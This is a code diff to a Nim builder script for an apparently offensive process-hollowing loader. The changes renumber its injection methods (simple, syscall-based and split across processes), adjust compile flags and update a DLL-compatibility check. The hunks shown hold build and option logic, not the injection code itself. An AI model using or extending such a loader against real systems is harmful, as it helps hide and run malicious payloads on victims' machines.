@@ -86,8 +86,9 @@ when isMainModule:
         arg("injection-method", help="""Injection method
 
         1 - Simple hollowing
-        2 - Syscalls hollowing (using NimlineWhispers2)
-        3 - Splitted hollowing using multiple processes and syscalls
+        2 - Syscalls hollowing
+        3 - Splitted hollowing using multiple processes
+        4 - Splitted hollowing using multiple processes and syscalls
         """)
         option("-s", "--sponsor", help="Sponsor path to hollow (default: self hollowing)")
         option("-a", "--args", help="Command line arguments to append to the hollowed process")
@@ -135,8 +136,8 @@ when isMainModule:
         quit(1)
 
     # Validate params
-    if injectionMethod == "3" and outFormat == "dll":
-        echo "[-] Injection method 3 isn't compatible with dll format"
+    if injectionMethod == "4" and outFormat == "dll":
+        echo "[-] Injection method 4 isn't compatible with dll format"
         quit(1)
 
     # Compress & encode exe payload
@@ -165,16 +166,16 @@ var sleepSeconds* = {sleepSeconds}
 
     # Choose injection method
     if injectionMethod == "1":
-        compileFlags.add(" -d:hollowsimple")
+        compileFlags.add(" -d:hollow1")
     elif injectionMethod == "2":
-        compileFlags.add(" -d:hollownimline")
-    elif injectionMethod == "3":
-        compileFlags.add(" -d:hollowsplitted")
+        compileFlags.add(" -d:hollow2")
+    elif injectionMethod == "4":
+        compileFlags.add(" -d:hollow4")
     else:
         echo "[-] Injection method doesn't exist :("
         quit(1)
         
-    if injectionMethod in ["2", "3"]:        
+    if injectionMethod in ["2", "4"]:        
         #[ 
         Loader crashes when using NimlineWhispers2 as release compilation
         Should be compiled as debug or as release with --stacktrace:on --linetrace:on
@@ -209,7 +210,7 @@ proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
     var res = execCmdEx(compileCmd, options={poStdErrToStdOut})
     if res[1] == 0:
         echo "[+] Compiled successfully"
-        if injectionMethod == "3":
+        if injectionMethod == "4":
             echo "[i] Run the hollower with -M argument"
     else:
         echo "[-] Error compiling. compilation output:"
